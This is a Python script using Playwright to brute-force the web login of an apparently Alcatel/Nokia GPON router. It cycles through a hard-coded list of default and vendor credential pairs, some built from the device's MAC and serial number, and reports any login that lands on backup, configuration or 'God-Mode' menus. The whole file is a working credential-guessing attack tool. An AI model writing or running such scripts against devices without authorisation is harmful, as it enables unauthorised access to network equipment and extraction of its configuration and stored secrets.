import asyncio
import os
from playwright.async_api import async_playwright
from dotenv import load_dotenv

load_dotenv()

# Injected your specific hardware details
MAC = "145808ED0500" 
SN = "ALCLB2603A69"  

CREDENTIALS = [
    ("AdminGPON", "ALC_FGU"),
    ("adminadmin", "ALC#FGU"),
    ("admin", "ALC#FGU"),
    ("admin", "1234"),
    ("admin", "admin"),
    ("support", "support"),
    ("support", "1234"),
    ("debug", "debug"),
    ("debug", "1234"),
    ("user", "user"),
    ("telecomadmin", "admintelecom"),
    ("root", "admin"),
    ("root", "root"),
    ("admin", MAC),
    ("admin", SN),
    ("Admin", MAC),
    ("Admin", SN),
    ("admin", SN.lower()),
    ("Admin", SN.lower()),
    ("useradmin", SN),
    ("admin", "ALC#FGU" + SN),
    ("admin", SN + "ALC#FGU"),
    ("admin", "ALC_FGU"),
    ("Admin", "ALC_FGU"),
    ("support", "support123"),
    ("operator", "operator"),
]

async def test_creds():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(ignore_https_errors=True)
        
        print(f"[*] Starting brute-force for {len(CREDENTIALS)} credential pairs...")
        
        for user, pwd in CREDENTIALS:
            if not pwd: continue
            page = await context.new_page()
            try:
                await page.goto(os.getenv("ROUTER_IP"), timeout=10000)
                inputs = await page.locator("input").all()
                for inp in inputs:
                    if not await inp.is_visible(): continue
                    itype = await inp.get_attribute("type")
                    if itype == 'text': await inp.fill(user)
                    elif itype == 'password': await inp.fill(pwd)
                
                buttons = page.locator("button, input[type='button'], input[type='submit'], a")
                for i in range(await buttons.count()):
                    btn = buttons.nth(i)
                    if await btn.is_visible():
                        text = (await btn.text_content() or await btn.get_attribute("value") or "").lower()
                        if "log" in text or "sign" in text or "submit" in text:
                            await btn.click()
                            break
                            
                await asyncio.sleep(3)
                url = page.url
                content = await page.content()
                
                # Check if login failed (usually redirects back to login or shows error)
                if "login" in url.lower() or "password" in content.lower()[:1000] or "invalid" in content.lower() or "failed" in content.lower():
                    print(f"[-] Failed: {user} / {pwd}")
                else:
                    print(f"[!] SUCCESS: {user} / {pwd} -> Landed on: {url}")
                    # Check if backup menu exists for this user!
                    if "backup" in content.lower() or "configuration" in content.lower() or "romfile" in content.lower() or "super" in content.lower() or "management" in content.lower():
                        print(f"    -> BINGO! Backup/Config menu or God-Mode keywords visible for this user!")
            except Exception as e:
                print(f"[-] Error testing {user}/{pwd}: {e}")
            finally:
                await page.close()
                
        await browser.close()
        print("[*] Done testing.")

if __name__ == "__main__":
    asyncio.run(test_creds())
